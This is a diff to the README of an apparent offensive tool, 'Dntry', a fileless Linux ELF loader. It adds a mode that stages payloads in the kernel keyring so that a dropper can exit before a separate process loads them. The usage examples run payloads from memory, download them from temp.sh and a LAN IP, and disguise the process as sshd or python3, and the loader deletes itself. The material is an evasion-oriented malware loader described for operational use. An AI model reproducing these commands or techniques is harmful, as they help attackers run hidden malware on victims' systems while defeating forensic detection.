@@ -2,7 +2,7 @@
 
 <img src="https://i.imgur.com/O15awdJ.png" alt="Dntry" width="600"/>
 
-Fileless ELF loader with nine execution modes across three techniques.
+Fileless ELF loader with eleven execution modes across four techniques.
 
 - https://discord.gg/rootkits
 
@@ -15,7 +15,10 @@ Allocates an anonymous inode on a real filesystem with no directory entry, write
 Stores the ELF payload in kernel slab memory via `add_key("user")` with no fd, no inode and no VFS involvement. The payload is read back via `keyctl(KEYCTL_READ)`, the key is revoked, and the ELF is loaded manually by walking PT_LOAD segments and jumping to the entry point with no `execve` or `execveat` call. Payload limit ~20 KB (per-user quota).
 
 **Kernel keyring (big_key) + userland exec**
-Same as above but uses `add_key("big_key")` which stores payloads up to 1 MiB. Above ~840 bytes the kernel stages the data in an encrypted kernel tmpfs rather than plain slab. Requires `CONFIG_BIG_KEYS=y` (default on Ubuntu Server, RHEL 8/9; not set on Kali). Returns `ENODEV` if unavailable.
+Same as above but uses `add_key("big_key")` which stores payloads up to 1 MiB. Above a small internal threshold the kernel stages the data in an encrypted kernel tmpfs rather than plain slab. Requires `CONFIG_BIG_KEYS=y` (default on Ubuntu Server, RHEL 8/9; not set on Kali). Returns `ENODEV` if unavailable.
+
+**Cross-process staging (stage + load)**
+`stage` stores the ELF in the session keyring and prints the key ID, then exits. A completely separate process later runs `load <key_id>` to pull the bytes from kernel slab and execute. The payload lives only in kernel memory between the two processes: no shared memory, no socket, no file between them. `KEY_SPEC_SESSION_KEYRING` is inherited across `fork`/`exec` within the same PAM session, so the key survives after the dropper dies.
 
 ## Requirements
 
@@ -57,6 +60,10 @@ make demo     # diagnostic payload (prints pid, exe, maps)
 ./dntry bkfile  <elf>  [spoof_name]
 ./dntry bkhttp  <url>  [spoof_name]
 ./dntry bkstdin [spoof_name]
+
+# Cross-process staging: dropper stores payload and exits, loader executes later
+./dntry stage <elf>
+./dntry load  <key_id> [spoof_name]
 ```
 
 `spoof_name` becomes `argv[0]` of the loaded process and the thread name via `prctl(PR_SET_NAME)`, defaults to `python3`.
@@ -69,6 +76,15 @@ cat payload.elf | ./dntry kstdin sshd
 ./dntry khttp https://temp.sh/aBcDe/payload sshd
 
 ./dntry http http://192.168.1.10:8080/payload python3
+
+# Cross-process staging: dropper writes payload and exits
+KEY=$(./dntry stage payload.elf)
+
+# key survives in kernel slab after dropper is dead:
+# 23214cfe I--Q---  user  _dntry: 9808
+
+# loader runs later with no shared memory between the two
+./dntry load $KEY sshd
 ```
 
 ## Keyring limits
@@ -77,6 +93,7 @@ cat payload.elf | ./dntry kstdin sshd
 |------|----------|------------|---------|
 | `kfile/khttp/kstdin` | `user` | ~20 KB (per-user quota) | nothing extra |
 | `bkfile/bkhttp/bkstdin` | `big_key` | 1 MiB | `CONFIG_BIG_KEYS=y` |
+| `stage/load` | `user` | ~20 KB (per-user quota) | nothing extra |
 
 The default per-user quota is 20000 bytes via `/proc/sys/kernel/keys/maxbytes`. Root has a separate quota of 25 MB via `/proc/sys/kernel/keys/root_maxbytes`.
 
@@ -101,4 +118,10 @@ The default per-user quota is 20000 bytes via `/proc/sys/kernel/keys/maxbytes`. 
 6. Loader unlinks itself via `readlink("/proc/self/exe")`
 7. Registers are zeroed and execution jumps to the ELF entry point
 
-`big_key` above ~840 bytes stores the payload in an encrypted kernel tmpfs instead of plain slab.
+`big_key` above a small internal threshold stores the payload in an encrypted kernel tmpfs instead of plain slab.
+
+## How it works (stage + load)
+
+`stage` runs step 1 only: stores the ELF and prints the key ID to stdout, then exits. The payload stays in kernel slab memory after the process dies because `KEY_SPEC_SESSION_KEYRING` is attached to the PAM session, not to any process.
+
+`load <key_id>` runs steps 2–7 in a completely separate process. Between `stage` exiting and `load` running, the payload exists only inside the kernel: no file, no fd, no shared memory, no socket between the two processes. The two processes are fully decoupled.
